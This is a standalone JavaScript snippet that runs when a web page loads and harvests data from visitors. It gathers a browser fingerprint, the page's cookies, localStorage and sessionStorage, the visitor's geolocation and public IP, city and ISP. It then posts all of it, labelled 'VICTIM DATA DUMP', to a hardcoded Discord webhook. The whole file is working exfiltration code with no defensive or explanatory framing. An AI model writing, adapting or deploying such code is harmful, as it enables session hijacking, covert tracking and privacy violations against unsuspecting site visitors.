window.onload = function() {
    // 1. COLLECT ALL THE DATA
    const stolenData = {
        // --- Basic Browser Fingerprinting ---
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.toString() : 'N/A',
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,

        // --- Screen & Display ---
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        availScreenResolution: `${screen.availWidth}x${screen.availHeight}`,

        // --- System & Hardware ---
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || 'N/A', // Chrome only
        maxTouchPoints: navigator.maxTouchPoints,

        // --- Network & Connection ---
        onlineStatus: navigator.onLine,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
        } : 'N/A',

        // --- Location (Will prompt the user for permission!) ---
        // This is aggressive and will likely be denied, but worth a shot.
        location: 'Permission Denied',
        
        // --- Data we will fill in later ---
        ip: 'Fetching...',
        publicIP: 'Fetching...',
        cookies: 'N/A',
        localStorage: 'N/A',
        sessionStorage: 'N/A',
        timestamp: new Date().toISOString()
    };

    // 2. GRAB STORAGE DATA
    try {
        stolenData.cookies = document.cookie;
        stolenData.localStorage = JSON.stringify(localStorage);
        stolenData.sessionStorage = JSON.stringify(sessionStorage);
    } catch (e) {
        console.error("Could not access storage:", e);
    }

    // 3. TRY TO GET GEOLOCATION (AGGRESSIVE)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                stolenData.location = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}, Accuracy: ${position.coords.accuracy}m`;
                // We have location, now try to get IP and send
                getIPAndSend(stolenData);
            },
            (error) => {
                // User denied or error occurred
                stolenData.location = `Error: ${error.message}`;
                // Failed to get location, still try to get IP and send
                getIPAndSend(stolenData);
            }
        );
    } else {
        // Geolocation not supported
        getIPAndSend(stolenData);
    }
};

// 4. GET IP ADDRESSES AND SEND
function getIPAndSend(data) {
    // Use a service that gives more detail
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            data.publicIP = ipData.ip;
            data.country = ipData.country_name;
            data.region = ipData.region;
            data.city = ipData.city;
            data.isp = ipData.org;
            data.isVPN = ipData.org.toLowerCase().includes('vpn') || ipData.org.toLowerCase().includes('hosting');
        })
        .catch(error => {
            console.error('IP API failed:', error);
            // Fallback to ipify if ipapi fails
            return fetch('https://api.ipify.org?format=json');
        })
        .then(response => {
            if (response) {
                return response.json();
            }
        })
        .then(ipifyData => {
            if (ipifyData && ipifyData.ip) {
                data.publicIP = ipifyData.ip;
            }
        })
        .finally(() => {
            // Whether IP fetch succeeded or failed, send the data
            sendData(data);
        });
}

// 5. SEND THE DATA TO DISCORD
function sendData(data) {
    const webhookURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';

    let messageContent = "--- VICTIM DATA DUMP ---\n";
    for (const key in data) {
        if (data.hasOwnProperty(key)) {
            // Handle objects and arrays by stringifying them
            let value = data[key];
            if (typeof value === 'object' && value !== null) {
                value = JSON.stringify(value);
            }
            messageContent += `**${key}**: ${value}\n`;
        }
    }
    
    // Discord message limit is 2000 characters. Truncate if needed.
    if (messageContent.length > 1950) {
        messageContent = messageContent.substring(0, 1950) + "\n... (truncated)";
    }

    const payload = {
        content: messageContent
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}
